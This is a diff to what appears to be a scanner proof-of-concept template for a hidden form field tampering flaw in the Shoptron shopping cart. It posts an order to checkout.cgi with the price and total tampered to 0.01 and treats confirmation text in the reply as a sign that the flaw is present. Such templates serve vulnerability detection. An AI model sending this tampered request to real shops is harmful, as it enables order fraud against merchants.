@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 Shoptron 购物车应用是否存在隐藏表单字段未校验漏洞。通过发送包含篡改后价格字段（price=0.01）的 POST 请求到订单提交接口，若响应包含成功订单确认信息，则说明服务端未对隐藏字段进行校验，存在数据篡改风险。"
+author = "ave"
+description = "Shoptron 购物车系统未对隐藏表单字段做服务端完整性校验。攻击者可拦截 HTTP POST 请求并修改 hidden 类型字段（如 price、total、discount 等敏感购买信息），实现对订单数据的未授权篡改。PoC 发送含篡改金额的 POST 请求，验证服务端是否接受未经验证的隐藏字段修改。"
 id = "POC-AVE-2000-0089"
-name = "Shoptron 购物车隐藏表单字段修改漏洞 PoC"
+name = "Shoptron Shopping Cart Hidden Form Field Tampering PoC"
 severity = "high"
 tags = ["ave-2000-0089"]
 vuln_id = [
@@ -11,15 +11,15 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/order.cgi"
+path = "/{{BaseURL}}/checkout.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "item_id=1&quantity=1&price=0.01&submit=1"
+content = "item=1&quantity=1&price=0.01&total=0.01&submit=1"
 type = "raw"
 
 [poc.requests.headers]
@@ -30,8 +30,9 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "Order Confirmed",
-    "order_number",
+    "Thank you",
+    "Order Complete",
     "Your order has been",
-    "Thank you for your order",
+    "confirmation number",
+    "order number",
 ]
